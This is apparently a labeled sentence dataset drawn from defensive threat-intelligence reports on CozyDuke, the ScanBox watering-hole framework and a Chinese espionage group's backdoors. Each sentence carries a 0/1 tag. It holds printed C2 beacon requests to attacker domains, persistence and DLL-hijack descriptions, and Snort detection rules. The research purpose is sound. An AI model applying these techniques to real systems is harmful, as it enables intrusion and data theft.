These executables are usually droppers similar to those used to infect a host with CozyDuke .	0
In this case , however , instead of dropping CozyDuke , the executables may drop other executables , scripts or DLLs .	1
Once executed by CozyDuke , these executables function independently of CozyDuke 's main component .	0
Listed below are the modules we have observed being used : We have observed executables executed by CozyDuke for the following purposes .	0
These executables will implement their own methods of C&C communication and data exfiltration .	0
In many cases , the scripts utilized Microsoft OneDrive accounts for data transfer .	0
The earliest CozyDuke sample we have observed so far was compiled on the 29th of December , 2011 .	0
The sample in question was not an actual CozyDuke main component , but a CozyDuke module .	0
The earliest main component we observed was compiled on the 29th of February , 2012 .	0
The main component in question stores its strings and configuration in an unencrypted form .	0
Additionally , the configuration is stored embedded in the binary , not as a separate XML file in the manner of newer CozyDuke versions .	0
Even this oldest main component does however use XML for other purposes via the open - source Pugi - XML library .	0
The next CozyDuke main component we observed was compiled on the 30th of November , 2012 .	0
By then , the authors had switched to encrypting the strings and the configuration .	0
However , the configuration was still stored embedded in the binary .	0
Design - wise , this sample is a bit of an outlier .	0
Instead of being a DLL file , the main component is actually an EXE that , in addition to the configuration , embeds multiple DLLs that provide additional functionality to the main component .	0
Apart from the different design , functionally the main component is very similar to other CozyDuke main components .	0
It is possible the authors of CozyDuke were trying out a new design , but eventually decided to go back to the original .	0
The next CozyDuke main component we observed , compiled on the 2nd of July , 2014 , is again a DLL file .	0
By now , the authors of CozyDuke had switched from an embedded configuration to the external XML- formatted configuration file seen today .	0
We have yet to observe samples from 2013 , but we believe CozyDuke to have been under active development as well during that year .	0
Between 2012 and 2014 , the authors of CozyDuke appear to have performed significant refactoring of the CozyDuke codebase , even though functionally the differences are smaller .	0
Examples of this refactoring include for instance the switch from using the Pugi - XML library to using Microsoft 's MSXML 3.0 for XML - related functionality .	0
The latest CozyDuke main component we observed was compiled on the 26th of February , 2015 .	0
The core functionality of the latest sample is very similar to the previous sample from July of 2014 , but the authors of CozyDuke have implemented a lot of additional functionality , as the increase in size from 279 KB to 820 KB would also suggest .	0
Based on logging strings , variable naming and PDB strings found in CozyDuke samples , we observed the following .	0
PDB strings found in early CozyDuke samples are listed in Table 4 ( below ) .	0
APPENDIX A | SAMPLE HASHES Filenames ( Note : we believe many of these to be borrowed from legitimate files ) User agent strings Mutexes	0
Please e - mail us at threatintelligence@uk.pwc.com for a version of this report with additional indicators that you are welcome to distribute so long as it is not on public channels ( TLP - GREEN ) .	0
We have observed actors amending the ScanBox framework to evade existing public signatures , detailed below .	0
Security researchers have often made the mistake of assuming that when a specific tool was observed being used in espionage attacks , it was representative of activity of a single actor .	0
More frequently , however , many are now identifying that distinct groups of attackers are sharing their toolsets , just as in the cybercrime world .	0
One such toolset , the ScanBox framework , is now shared between a number of groups who conduct espionage attacks .	0
Evidence suggests that these groups include those behind the recent Forbes and Anthem attacks .	0
This short paper outlines our current perspectives on the previously discussed espionage groups currently using the framework and a hint that a 5th player is getting in on the game .	0
ScanBox performs keylogging of users when they visit a compromised website , without requiring malware to be deployed , and can collect a great deal of information which can be used to tailor future attacks In October we published some details of the ScanBox tool set .	1
Since then we have encountered 24 additional sites compromised with the framework .	0
Over this time we have observed changes to the code and novel techniques for executing .	0
We have also received a number of tip offs from other researchers , as well as queries from victims who were directly targeted by those using the framework .	0
We would like to extend our thanks to these individuals for their contributions towards this research .	0
The following diagram shows the links in tools and targets between the groups discussed in our previous blog , but newer information has since come to light which allows us to more accurately associate these groups with known threat actors .	0
Between these clusters , we 've seen strategic web compromises designed to target users in the following countries .	0
Tactical Intelligence Bulletin – TLP : WHITE Since our last post there have been several alterations to the ScanBox code base , including new modules , changes to avoid signature based detection , as well as extra techniques to try to identify whether those being scanned are real machines or researchers .	0
In some cases we have been able to watch developers update and test variants of the framework , and even come across server - side code being tested by budding hackers .	0
Our findings are detailed below .	0
Following on from our previous post on ScanBox1 , we have watched the clusters of activity outlined with close interest , as well as keeping an eye on new adopters of the ScanBox framework .	0
For those who did n't read our last entry on the framework , nor the excellent work by Jaime Blasco2 which preceded it , ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform reconnaissance and key logging of visitors to compromised websites without requiring any malware to be downloaded or installed .	1
The framework has remained in use since initial analyses were published , and further analysis of the code , public reporting , as well as the infrastructure used to host ScanBox infections has given us a better picture of some of the clusters of activity we identified in our earlier blog .	0
In addition to the four websites we previously identified hosting the malicious code , we 've now identified a further 24 websites hosting the framework .	0
Anonymised data relating the countries and sectors affected are given in appendix A.	0
Broadly , the ScanBox framework codebase has remained the same , however there are slight nuances in some aspects of the code , or in the software attackers choose to search for .	0
In cases where the attackers have included software checks within their ScanBox code , it tends to be for the same original list of filenames ( Appendix C ) .	0
In some cases the attackers customise the list , presumably based on the things they 're expecting to find .	0
For example , adding or removing additional security products based on the predominant software providers in their target region .	0
It 's also worth noting that the standard list includes quite a lot of software which is less relevant to security ( examples include WinRAR , iTunes and WinZip ) .	0
Some of these may be included in order to help the attackers to try and identify real victims vs researchers / sandboxes / honeypots .	0
An example list is shown in the following screenshot .	0
In one cluster of ScanBox activity , instead of checking for specific files as per the method above , the attackers have implemented a different method of tracking files and drives present on the victim machine .	1
The first piece of new functionality is that the attackers build a possible list of drive names ( A - Z ) and scan for the existence of each drive .	0
They do not check files directly either , instead , checking for the presence of a list of folder names .	0
In this case , rather than determining what security software is present , this check would mainly be useful in assisting the attacker with identifying the victim 's operating system .	0
This could then be used to tailor future attacks ( i.e.	0
should I deploy malware which can bypass UAC ? Should I send malicious documents targeting CVE-2012 - 0158 or not ? ) .	0
Also , bizarrely the attackers check the path ' Program Files ( x80236 ) ' – if anyone knows what this corresponds to , please get in touch and let us know .	0
As we stated earlier , some of the features of the original ScanBox code were probably designed to help those analysing results distinguish between honeypots / analysis environments and real - world victims .	0
The newly added variables include .	0
Updates to evade signatures Possibly in response to our previous report , we 've seen some of the groups using ScanBox alter the content of the modules to evade detection .	0
Attackers do read reports , both to help them attack3 and also to evade detection .	0
One change has been the URI formats used to deliver stolen key log data from obvious URLs such as .	0
/k.php?data=[KeyloggerData ] To more subtle URLs such as .	0
/[KeyloggerData].jpg We also note that following our release of a signature to detect the phrase " No Java or Disable " , which was present in a number of related frameworks , some of the attackers have now changed this to " No or Disable " .	0
In our previous entry on ScanBox we described four clusters of activity – this section includes updates on those clusters .	0
Previously , we were only able to cluster activity based on the infrastructure used and the associated malware , we now have a sufficient number of samples to cluster based on differences in implementation between the code used for ScanBox in each case .	0
The recently published FBI flash alert # A-000049-MW4 , cited domain names previously referenced in our blog as being related to an actor known as Deep Panda , which we 'll get to in a minute .	0
The link appears to have been made from the use of the DerUsbi malware family though , which we know to be used by several espionage actors .	0
What is interesting is the potential overlap between the target selection of this cluster and the targets of those behind the recently reported Forbes compromise5,6 .	0
Checking the Google SafeBrowsing results for * .googlecaches.com , shows that the domain was used for distribution of malicious code for a significant period after our previous blog entry .	0
This includes distribution via gokbayrak.com .	0
Looking at whether any other domains or IP addresses were observed delivering malicious software via gokbayrak.com shows that it was also observed delivering malware via 88.80.190[.]133 .	0
This is the same IP address that was cited in iSight 's reporting of the Forbes breach .	0
In fact , the IP address 88.80.190.133 was involved in the compromise of the same 3 websites as SafeBrowsing shows were affected by googlecaches.com .	0
The same three sites targeted with the 0-day used in the Forbes attack were also observed distributing malware via googlecaches[.]com - we therefore believe it 's likely that the group we previously described as ' Cluster 1 ' was behind the Forbes compromise .	0
We can use similar techniques to explore other actors who have the same tasking as Cluster 1 .	0
In the screenshot of websites delivering malware via gokbayrak.com , we saw that the domain name macanna.com[.]tw was also used to distribute malware from this page .	0
Whilst macanna.com[.]tw appears to be a legitimate site , it has also been observed as being a command and control destination for malware .	1
The malware sample in question has a hash of 3b8d7732de3b3c8823d241e7cd3185c4 .	0
The same sample also communicates with happynewyear.dns04[.]com , which in turn resolves to the IP address 115.23.172[.]151 , which hosts a large number of other malicious host names .	0
These following hostnames are activity associated with the actor best known as TH3Bug7 - named after their choice of Poison Ivy password .	0
Their malware samples are present in the same cluster .	0
This cluster relates to the threat actor referred to as Deep Panda by CrowdStrike , as was confirmed in a recent blog post8 .	0
In turn , this is widely believed to relate to the incident at Anthem , as described in a Krebs post9 .	0
The graph below shows the links between the we11point.com domain name , and news.foundationssl[.]com as seen on the CrowdStrike blogpost .	0
The Krebs article also points toward other possible ( although not explicit ) links between the domain allegedly used in the Anthem hack ( we11point.com ) to Cluster 2 through shared WHOIS details , as we11point.com was registered by domain re - seller ' li2384826402@yahoo.com ' On its own , this would not be sufficient to associate the two clusters , but it is useful to note as a ' softer ' overlap .	0
Cluster 3 remains a mystery , unfortunately the code used in this instance is the most slim line version , and has since not been widely re - used – it is unclear who was behind the compromise using this domain name .	0
We 'd previously missed the link between Cluster 4 – and malware widely known as ' EvilGrab ' or ' Vidgrab ' .	0
From our view point , this malware is exclusively used by one group , known by CrowdStrike as Stone Panda10 .	0
In addition to the four clusters outlined above , within the 24 additional compromises identified , we believe there are at least 3 other distinct groups using the framework .	0
In their 2013 paper ' From Quartermaster to Sunshop'11 , FireEye described the concept of a Digital Quartermaster , a kind of malware supply chain for intrusions , where a skilled team would develop toolsets for a range of attackers who deploy them .	0
The shared use of ScanBox may match up quite well to this hypothesis , and indeed even to some extent the naming schema overlaps , as iSight refer to the actor behind the Forbes breach as Codoso , but suggest they are publically known as ' Sunshop ' .	0
In all likelihood this relates to a series of blogs byFireEye which refer to a series of web compromises in 2013 as being the SunShop12 campaign .	0
Although we did not notice the correlation immediately , there is good overlap between the groups we 've described above , and the clusters of activity described as sharing a Flash 0-day in early 2014 by Symantec13 .	0
Although other groups have since begun using the framework , the first groups to use the framework ( clusters 1 - 4 ) correspond quite nicely to the existing Symantec blog .	0
For reference , we 've overlaid our ScanBox clusters against the likely clusters Symantec created behind the scenes for their blog , as well as other popular names .	0
Please note that each vendor has their own way of grouping activity together , so these mappings are given on a best efforts basis .	0
In all examples of ScanBox deployments discussed so far , we believe that the scripts were deployed to anyone who visited websites of interest to a given sector which the attacker was able to compromise– and that the attackers waited for victims to visit the compromised site .	0
However one group of attackers using the ScanBox framework are now actively sending e - mails to potential victims , where the e - mails contain links to websites hosting ScanBox .	1
We believe these attackers are not covered by the existing clusters 1 through 4 , as the code differs from that used elsewhere .	0
This method of sending links rather than waiting for visiting a specific compromised website has two main advantages .	0
This group differs from the others based on the following characteristics .	0
So far we have identified four low key websites , all belonging to small companies based in the United States or Canada which are being abused in this fashion .	0
At one point during our investigation into infrastructure hosting ScanBox code , we identified a server which appeared to be used for development and testing purposes .	0
On this occasion , the server side code was publicly accessible , allowing us to gain insights into the development and testing phase of an attack using ScanBox .	0
This also included the ScanBox framework 's own detailed reconnaissance against the developer themselves .	0
We noted the developer repeatedly uploading the modified versions to VirusTotal , presumably in an attempt to improve evasion of anti - virus .	0
We do not believe this developer is part of the core group that has access to the original implementation , but is instead another actor , who is likely rebuilding ScanBox from samples they find online .	0
The screenshot on the left is from a version currently in development by a possible attacker , the corresponding screenshot on the right is from a public article15 .	0
The publication of threat information allows us to draw links between different campaigns , tools and malware but we need to be careful about which links we consider to be significant and ensure we 're confident in how information that 's publically available was derived .	0
The summary above is just our view of the overlaps in web based tools / exploits and targets between different threat actors , but those with different datasets may be able to draw different conclusions .	0
Last time , we identified three possible hypotheses to explain the overlap between the ScanBox users , in this blog , based on the data we have available , we can settle on just one of these conclusions .	0
" 2 .	0
Selections of actors share some resources , as per previous observations with similar kits by some security vendors .	0
" Specifically , our key conclusions are .	0
What is not clear is why specific resources ( web - based exploits ) appear to be shared , and why others ( primarily malware families ) are sometimes kept within a specific cluster .	0
Snort Signatures – TLP WHITE alert tcp $ EXTERNAL_NET any - > $ HOME_NET any ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox and Targetted Watering Holes Content ( plugin_pdf_ie ( ) ) " ; flow : established , from_server ; file_data ; content:"plugin_pdf_ie ( ) " ; classtype : trojan- activity ; reference : url , pwc.blogs.com / cyber_security_updates/2014/10/scanbox- framework-whos-affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any - > $ HOME_NET any ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Watering Hole Content ( .item(0).appendChild(iframe_tag ) ) " ; flow : established , from_server ; file_data ; content:".item(0).appendChild(iframe_tag ) " ; classtype : trojan - activity ; reference : url , pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any - > $ HOME_NET any ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox and Targetted Watering Holes Content ( var version\;var ax\;var e\;try{axo = new ActiveXObject ) " ; flow : established , from_server ; file_data ; content:"var version\;var ax\;var e\;try{axo = new ActiveXObject " ; classtype : trojan - activity ; reference : url , pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any - > $ HOME_NET any ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Watering Hole Content ( document.getElementsByTagName('head').item(0).appendChild(form_tag)\ ; ) " ; flow : established , from_server ; file_data ; content:"document.getElementsByTagName('head').item(0).appendChild(form_tag)\ ; " ; classtype : trojan - activity ; reference : url , pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any - > $ HOME_NET any ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Watering Hole Content ( return ( ( ! a ) ? ' x- ' : a ) + Math.floor(Math.random ( ) * 99999)\ ; ) " ; flow : established , from_server ; file_data ; content:"return ( ( ! a ) ? ' x- ' : a ) + Math.floor(Math.random ( ) * 99999)\ ; " ; classtype : trojan - activity ; reference : url , pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any - > $ HOME_NET any ( msg:"--[PwC CTD ] -- MultiGroup - TH3BUG and Non - Targetted Groups Watering Hole Code ( Chr(CInt(ns(i ) ) Xor n ) ) " ; flow : established , from_server ; file_data ; content:"Chr(CInt(ns(i ) ) Xor n ) " ; classtype : trojan - activity ; reference : url , pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) Where the site was referenced via phishing as opposed to ' Watering Hole ' based activity , it has been excluded from the following table .	0
Where we have an assigned cluster , but have not discussed it in this document , we have given ' Cluster [ Letter ] ' these are not intended as names for groups .	0
Where we do not have an associated group we have listed ' unknown ' under this field .	0
Fortinet F - PROT F - Secure f - secure2011 IKARUS Immunet iTunes JiangMin Kaspersky_2012 Kaspersky_2013 Kaspersky_Endpoint_Security_8 mcafee_enterprise Mse Norman Norton Nprotect Outpost PC_Tools QuickHeal Rising Rising_firewall sophos SQLServer Sunbelt SUPERAntiSpyware Symantec_Endpoint12 symantec - endpoint Trend2013 ViRobot4 VirusBuster vmware - client vmware - server WinRAR winzip For more in - depth coverage , including full details of the analysis behind this blog as well as additional indicators which can be used to detect similar samples , or if you have any other queries , please give us a shout at threatintelligence@uk.pwc.com .	0
The information contained in this document has been prepared as a matter of interest and for information purposes only , and does not constitute professional advice .	0
You should not act upon the information contained in this email without obtaining specific professional advice .	0
No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this email , and , to the extent permitted by law , PricewaterhouseCoopers LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this email or for any decision based on it .	0
May 13 , 2015 By Jon Gross(http://blog.cylance.com / author / jon - gross ) Share This .	0
Attackers typically shut down campaigns or halt activity after they are exposed by security researchers , thereby creating the impression they have dropped off the map .	0
This often leads to a false sense of security within the community and perpetuates the idea that public exposure makes us all safer .	0
While the exposed activity is no longer observed , attackers simply continue in the background – evolving or altering their tactics to seamlessly continue operations with increasingly advanced malware .	0
So while potentially making us safer in the short - term , exposure often forces a Darwinian evolution in malware .	0
Several months ago I examined a malware - tainted Word document titled " ISIS_twitter_list.doc . " I did n't think much of it and quickly moved on after a cursory analysis .	0
Yet I recently uncovered evidence that suggests it was the work of a well - known Chinese threat group .	0
This group is known to have targeted U.S.	0
government agencies , defense contractors , aerospace firms and foreign militaries since 2009 .	0
Until now , it was widely believed the actor 's activities had largely subsided in 2013 , following numerous public disclosures and detailed analyses of their backdoors .	0
Our technical analysis shows the group has remained active .	0
We are releasing this data to help victims identify and remediate the threat .	0
Click here(http://blog.cylance.com / spear - a - threat - actor- resurfaces#mitigation ) to get to recommended mitigations , or for all the technical details read on .	0
It all began with the MIME encoded document " ISIS_twitter_list.doc " , which exploited the familiar CVE-2012- 0158(http://www.cve.mitre.org / cgi - bin / cvename.cgi?name = CVE-2012 - 0158 ) and was first uploaded to Virustotal from a user in India .	0
Other targets identified were predominantly located in Australia , New Zealand , Vietnam and the United States .	0
File Details Name ISIS_twitter_list.doc SHA256 6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40 File Size 146,338 bytes The first stage shellcode searches for the marker " GfCv " then checks the next four bytes are " EF FE EC CE " in the document then decodes the second stage shellcode using the four - byte XOR key " 0x29F7C592 " .	0
This second stage finds and decodes an encoded executable beginning at offset 0x33A2 .	0
The binary is encoded using a variable 4-byte XOR key that is generated by starting with the 4-byte key 0x7FFEFC00 ; this XOR key is then permutated every four bytes by rotating the first two bytes of the key by 0x1 and shifting the bits of the next two bytes right by 0x1 , so the next 4-byte XOR key in the series would be 0x3FFF7E00 .	0
It includes some logic to exclude XOR'ng any bytes that match 0x00000000 or the current 4- byte XOR key .	0
For the binary mathematically impaired like myself the 4-byte keys will eventually repeat in effect creating a 256-byte XOR key .	0
The decoded binary will be written to the filesystem as " % APPDATA%\Microsoft\Systemcertificates\Certificates.ocx " .	0
File Details Full File Path % APPDATA%\Microsoft\Systemcertificates\Certificates.ocx SHA256 9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165 File Size 107,008 bytes Compile Time 2/4/2015 8:41:42 UTC The malware does not execute immediately after successful exploitation and instead just creates a Run key in the current user 's hive which will execute the next time the victim user accesses the system .	1
Registry Persistence Key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates Registry Key Value Rundll32.exe " % APPDATA%\Microsoft\SystemCertificates\Certificates.ocx",Setup The ocx file is actually a DLL and provides the attacker the ability to upload , download , enumerate , delete , search , and execute files as well as list drivers on the system .	1
The binary is designed to be called from its one exported function , " Setup " ; the Run key will ensure that whenever the victim user logs into the system the backdoor will execute .	1
The binary is configured to communicate to " www.microsoftservices.proxydns.com " on port 80 using standard HTTP POST and GET requests .	1
The domain at the time of this report resolved to the IP address , " 103.229.125.157 " .	0
Additionally the dynamic DNS domains " fighthard.mooo.com " and " rampage.freetcp.com " have both historically resolved to this IP address .	0
Example initial beacon request .	0
GET /login?wd = hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q- H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH- nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ== HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 2.0.50727 ; .NET CLR 3.0.4506.2152 ; .NET CLR 3.5.30729 ; .NET CLR 1.1.4322 ) Host : www.microsoftservices.proxydns.com Cache - Control : no - cache The above beacon request can be decoded by base64 decoding with this alphabet , " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789- _ " .	0
Then RC4 decrypting the resulting string using the first four bytes of the payload as the decryption key .	0
The following python script will make this easy .	0
from Crypto . Cipher import ARC4 Decoding the string will yield the following .	0
Where k : is a unique identifier for the victim , s : is a campaign identifier included in the backdoor , h : is the hostname of the victim computer , u : is the victim user , o : is the operating system and service pack level , and m is the mac address .	0
Based upon some cursory analysis the backdoor will look for encrypted commands within HTML comments returned from the C2 using the following format : " < ! ? * $ @COMMAND GOES HERE@$ * ? ! > ;"however , the C2 was not active at the time of analysis so this could not be confirmed .	1
The backdoor may also make requests to the C2 over HTTP using the following parameters in the URI string " query?sid= " and " result ? sid= " .	1
The PDB path , C:\Codes\Eoehttp\Release\Eoehttp.pdb , was also left in the backdoor although no other instances of this path could be identified .	0
Several additional exploit documents were identified by investigating the domains " fighthard.mooo.com " and " rampage.freetcp.com " .	0
Fighthard.mooo.com additionally resolved to 173.224.214.12 in February of 2014 .	0
The following exploit documents were identified to contain a payload which communicated to this domain .	0
Naval Science Curriculum 2014.doc 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c 1.doc c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd Republic Day speech 27 Jan 2014.doc 3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911 Rampage.freetcp.com still resolves to 103.229.125.157 as of 4/2/2015 Let 's go ahead and take a look further into one of the other expoit documents , 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c .	0
SHA256 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c Name Naval Science Curriculum 2014.doc File Size 459,087 The document exploits old faithful , CVE-2012 - 0158(http://www.cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2012 - 0158 ) , but instead of using a MIME encoded document this file was just a plain RTX document .	0
Yes that 's not a misspelling Word is happy to open this RTF format as well .	0
So for anyone exploring and hunting RTF documents you may also want to start looking for the " { \rtx " header .	0
We 'll skip the shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as an ASCII hex - encoded , xor - encoded binary .	0
It can be decoded using the XOR key " 0xBF " .	0
Upon successful exploitation the decoded binary will be written first to % TEMP%\dw20.EXEthen copied to % WINDIR%\msascm32.drv .	0
No other changes are made to the system .	0
File Details Full File Path : % WINDIR%\msacm32.drv SHA256 : 67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3 File Size : 108,544 Bytes Compile Time : 9/26/2013 01:46:23 UTC I 'm always curious when no registry changes are made in the exploitation process .	0
At first the backdoor failed to load or really do anything in my VM until I read what the " msascm32.drv " file does .	0
Looking at the original file 's ( % WINDIR%\system32\msacm32.drv ) imported functions , it 's clear the DLL is responsible for some type of audio processing and/or playback .	0
A quick search on the internet confirmed this so I added a soundcard to my VM .	0
On reboot explorer.exe was now happy to load the backdoor and get down to business ; this technique is known as dll search order hijacking or binary planting .	1
Interestingly the backdoor will also load the legitimate system32\msacm32.drv file resolve functions and pass calls to it so it does n't break audio playback on the victim system .	1
The backdoor contains identical exports as well as an additional dummy function from the legitimate msacm32.drvcalled " StartWork " which can be used to reliably identify similar samples .	1
The backdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via LoadLibrary it will begin spawning malicious threads .	1
A PDB path was also left in this binary C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb ; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80 .	0
The two files also have an identical compilation time , which suggests the backdoor is probably not recompiled very often and instead the attacker simply updates the callback configuration information .	0
The backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom backdoor .	0
It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol with the default connection password of " admin " .	0
The Poison Ivy shellcode is encrypted using a custom cipher with the key " Tiger324 { " beginning at offset 0xFA5 and ending at 0x159E.	0
If this initial connection fails it will revert to the secondary backdoor , which utilizes HTTP GET and POST requests somewhat similar to the ones described above to the internal IP address " 192.168.2.26 " .	0
This suggested the attacker had already compromised other systems in the environment and was using an internal C2 mechanism for a fallback .	0
Example Internal Beacon .	0
GET /login.asp ? p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX EJ7OZkvwBZVx1JsrhQ== HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) Host : 192.168.2.26 Requests may also be made to the following pages : " check.asp " , " result.asp " , and " upload.asp " .	0
The request structure is slightly different in that it uses the base64 alphabet " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 + * " .	0
The resulting request can be decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload .	0
It also uses a static User - Agent string of " Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) " for each request .	0
The following script simplifies this process .	0
The request decodes to " 123|000000+|USER - D6921F6215|Administrator|-1676096002|1.0|0| " , where values are separated by the delimiter " | " .	0
" 123 " is a campaign identifier hard coded into the backdoor .	0
I do n't know what " 000000 + " is but it 's also a hard coded value ; my best guess is it 's to modify the timezone of the timestamp .	0
" USER - D6921F6215 " is the hostname of the victim , " Administrator " is the victim user , " 1676096002 " is the current Date / Time in decimal , and " 1.0 " is a version number also stored in the backdoor . The 16-byte XOR key will be randomly generated per each request .	0
Results from commands will be sent back encoded to the server to the " result.asp " page .	0
The backdoor will accept the following commands .	0
Commands with a ? appear to take an additional parameter while files that end in - require a full file path .	0
The backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one described here : http://www.pretentiousname.com/misc/win7_uac_whitelist2.html .	0
I thought it was interesting the backdoor used a secondary backup backdoor in addition to its primary payload .	0
The first communicated directly outside the network using a well known RAT protocol and if that failed the secondary much stealthier backdoor communicated to an internal C2 address using it 's own custom encoded HTTP based protocol .	0
The use of a relatively undisclosed DLL search order hijack also made this sample unique .	0
Detection rates for this binary seem to be pretty good right now 39/57 ; however , at the time it was first used in late January 2014 detection rates were much poorer .	0
Other samples from the identified exploit documents were similar to the one described above with different network callbacks .	0
And now to tie all this back to the " well - known " threat group .	0
The " 173.224.214.12 " IP address that " fighthard.mooo.com " previously resolved to also historically had two other domains point to it " queenberry.www1.biz " and " word.crabdance.com " .	0
" word.crabdance.com " previously resolved to " 64.71.162.70 " on September 8 , 2012 and 108.171.246.140 on February 19 , 2014 .	0
The " 64.71.162.70 " address and the associated domain " www.ollay011.zyns.com " are rather infamous and the first mention of it I could find is in this shadowserver post : http://blog.shadowserver.org/2012/04/16/beware - of - what - you- download - recent - purported - ceiec - document - dump - booby - trapped/ related to exploit documents identified in a data dump from Hardcore Charlie .	0
If you follow the rabbit hole deep enough you can eventually trace samples via domain and IP address crossover back to the FBI flash # A-000009-MW from mid 2013 .	0
Additional domains and IP addresses related to this group are included in the appendix .	0
While defending against the constant stream of new malware from advanced threat groups may be difficult , organizations can take some relatively easy steps to help identify intrusions .	0
This group is among the numerous threat actors who rely almost exclusively on Dynamic DNS infrastructure .	0
They seem to prefer ChangeIP ( https://www.changeip.com / services / free - dynamic - dns/(https://www.changeip.com / services / free- dynamic - dns/ ) ) and Afraid ( https://freedns.afraid.org/(https://freedns.afraid.org/ ) ) for free DNS services , although they previously heavily used Sitelutions ( https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns ) ) .	0
While there are some legitimate instances of dynamic DNS in corporate environments , it only accounts for a small percentage of traffic .	0
Monitoring and/or blocking dynamic DNS requests should help detect attacks by this actor .	0
Any dynamic DNS domains that resolve to non - routable IP addresses , like 127.0.0.1 or private IP addresses , should be thoroughly investigated .	0
The HTTP traffic generated by both samples uses a limited number of header fields , which is substantially different from the majority of traffic generated by modern browsers .	0
As always , do n't open E - mail attachments from untrusted parties .	0
Tags : CylanceSPEAR(http://blog.cylance.com / topic / cylancespear ) Back to Blog(http://blog.cylance.com )	0
A personal note from Cylance , CEO Stuart McClure On February 24 , 1989 , United Flight 811 left Honolulu , Hawaii , on its way to Auckland , New Zealand , with 364 souls on board .	0
Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine passengers into the dark void over the Pacific Ocean .	0
This aviation disaster was later determined to have been caused by a simple design flaw combined with the lack of corrective action .	0
Boeing and the FAA had known about this problem for over one year prior to the accident .	0
The result : nine people lost their lives .	0
The other 337 passengers plus 18 crew members who survived , live with the memory every day ; all of it due to a highly preventable design flaw .	0
As a 19-year-old young adult , I was grateful to have survived but I had no idea how that single event would impact my future in such a profound way .	0
Much of my passion for cybersecurity can be directly attributed to that fateful day .	0
The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes .	0
Preventable disasters like this are what motivates the Cylance team to create a safer world .	0
We do everything we can to uncover the flaws in technologies before they damage the physical or cyber world .	0
Our mission is simple : to protect the world .	0
This report is an attempt to deliver on that mission .	0
After tracking hackers both personally and professionally for more than 26 years , there is no doubt in my mind that the release of the information contained in the Operation Cleaver report is vital to the security of the world's critical infrastructure .	0
The focus of the Operation Cleaver report is on one particular Iranian team we 've dubbed Tarh Andishan , the infrastructure they utilize , as well as their tactics , techniques and procedures .	0
Roughly translated , '' Tarh Andishan '' means '' thinkers '' or '' innovators '' .	0
This team displays an evolved skillset and uses a complex infrastructure to perform attacks of espionage , theft , and the potential destruction of control systems and networks .	0
While our investigation is ongoing , and we presently have limited visibility inside many of the compromised networks , Cylance observed Tarh Andishan actively targeting , attacking , and compromising more than 50 victims since at least 2012 .	0
